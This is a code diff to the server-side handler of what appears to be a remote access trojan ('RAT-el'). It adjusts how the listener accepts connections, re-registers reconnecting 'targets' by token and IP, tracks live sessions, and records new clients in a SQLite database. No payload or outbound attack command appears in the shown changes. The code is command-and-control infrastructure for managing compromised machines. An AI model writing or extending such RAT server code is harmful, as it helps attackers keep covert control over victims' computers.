@@ -94,14 +94,19 @@ class Handler(threading.Thread):
                 printColor("error","[-] Port {} is already busy or you don't have permission to listen on this port !".format(self.port))
                 #printColor("error","[-] "+str(e)+".")
                 printColor("information","[?] The server will try again to listen on port {}. If the server is still unable to listen on the port {} make sure to check which service is blocked with: netstat -petulan |grep {} command.".format(self.port,self.port,self.port))
-                time.sleep(3)
+                time.sleep(5)
                 print("\n")
                 
         Handler.start_handler = True #You can start the management 
         self.sock_server.listen(10)
         while True:               
-    
-            conn,address = self.sock_server.accept()
+            
+            try:
+                conn,address = self.sock_server.accept()
+            except Exception as e:
+                printColor("error","\n[+] error on listening (Handler)\n[+] forcing on process closure.\n\n")
+                os.kill(os.getpid()) #in test
+
             if(Handler.status_connection_display):
                 printColor("information","\r[+] New client {}:{}".format(address[0],address[1]))
             else:
@@ -214,14 +219,22 @@ The client first sends this information, then the server sends the parameters as
                 print("TOKKEN: ", token)
                 print(self.address)
                 if bool(Handler.dict_conn): 
-                    for value in Handler.dict_conn.values():
-                        #cette ligne qui pose pb:
-                        if(value[NB_TOKEN] == token and value[NB_IP] == self.address[0]): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
+                    for target in Handler.dict_conn.values():
+                        if(target[NB_TOKEN] == token and target[NB_IP] == self.address[0]): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
                             print("!!!!Token doublon!!!!")
                             print(self.address)
 
-                            already_in_the_dictionary = True
-                            nb_session_of_conn = value[NB_SESSION]
+                            if not (target[NB_ALIVE]): #if target is not already alive:
+                                '''
+                                If several customers have the same token it means that a machine has executed the RAT several times.
+                                In this case the server attributes the number of sessions according to the live connections. 
+
+                                This means that for example if there are 3 clients with the same token on the server. client number 1 can become number 3.
+                                '''
+                                already_in_the_dictionary = True
+                                nb_session_of_conn = target[NB_SESSION]
+                            else:        
+                                pass
 
                 else:
                     print("dict empty")
@@ -250,10 +263,9 @@ The client first sends this information, then the server sends the parameters as
                     max_error +=1 
                 
 
-
         #append data in dict
         if(already_in_the_dictionary):
-            tpl = already_in_the_dictionary, nb_session_of_conn
+            tpl = already_in_the_dictionary, nb_session_of_conn 
             #print("_______",type(tpl))
             return tuple(tpl)
         
@@ -264,15 +276,6 @@ The client first sends this information, then the server sends the parameters as
             list_info.append(token)
             return list_info
 
-    '''
-    def sendParameterOfClient(self): #NOT USE
-        #?????????
-        #print("SEND TOKEN")
-        #time.sleep(0.3)
-        self.sendUltraSafe("\r\n") #end echange.
-        
-        #print("FINISH handshake")
-    '''
 
     def run(self):
 
@@ -285,6 +288,7 @@ The client first sends this information, then the server sends the parameters as
             #print("sencode part persi go !!!! ")
             if type(info) == list:
                 if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
+                    printColor("error","NEWS CLIENT !!!")
                     self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3])
                     #print("IP IN DATABASE IS: ", self.ObjSql.returnValue(Handler.number_conn, "socket"))
                                                                                                                                                                         #select       
@@ -316,7 +320,6 @@ The client first sends this information, then the server sends the parameters as
                 print("SELECT")
                 Handler.dict_conn[nb_session][NB_SELECT] = False 
                 
-
         else:
             #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
             pass 
